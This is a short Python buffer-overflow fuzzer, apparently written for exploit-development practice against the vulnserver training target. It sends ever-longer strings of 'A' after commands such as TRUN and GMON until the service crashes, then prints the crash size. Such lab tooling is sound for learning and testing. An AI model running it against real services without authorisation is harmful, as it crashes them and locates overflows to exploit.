#!/usr/bin/env python3
import sys
import time
import socket
import argparse
from color_print import print_success, print_error, print_info

def get_command_suffix(command):
    COMMAND_SUFFIX = {
        "DEFAULT":"",
        "TRUN":"/.:/",
        "GMON":"/",
        "KSTET":".",
        "GDOG":"/..."
    }
    cmd_upper = command.upper()
    return COMMAND_SUFFIX.get(cmd_upper, COMMAND_SUFFIX["DEFAULT"])

def main():
    parser = argparse.ArgumentParser(description="BuffFuzzer v1.0")
    parser.add_argument("-ip",  type=str, help="Target IP address",  required=True)
    parser.add_argument("-port", type=int, help="Target port number", required=True)
    parser.add_argument("-cmd", type=str, help="Input defective commands.(e.g. TRUN)", required=True)
    args = parser.parse_args()

    target_ip = args.ip
    target_port = args.port
    command = args.cmd
    suffix = get_command_suffix(command)
    full_command = command + suffix

    buffer = "A" * 100

    while True:
        try:
            print(f"[-]Sending payload with {len(buffer)} bytes")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send((full_command + buffer).encode())                       
            s.settimeout(10)
            response = s.recv(1024)

            if not response:
                print(f"Target response timed out. Crashed at {len(buffer)} bytes.")
                sys.exit()

            s.close()
            time.sleep(1)
            buffer += "A" * 100

        except socket.timeout:
            print_success(f"Target response timed out. Crashed at {len(buffer)} bytes.")
            sys.exit()
        except Exception as e:
            print_error(f"An error occurred: {e}")
            sys.exit()

if __name__ == "__main__":
    main()
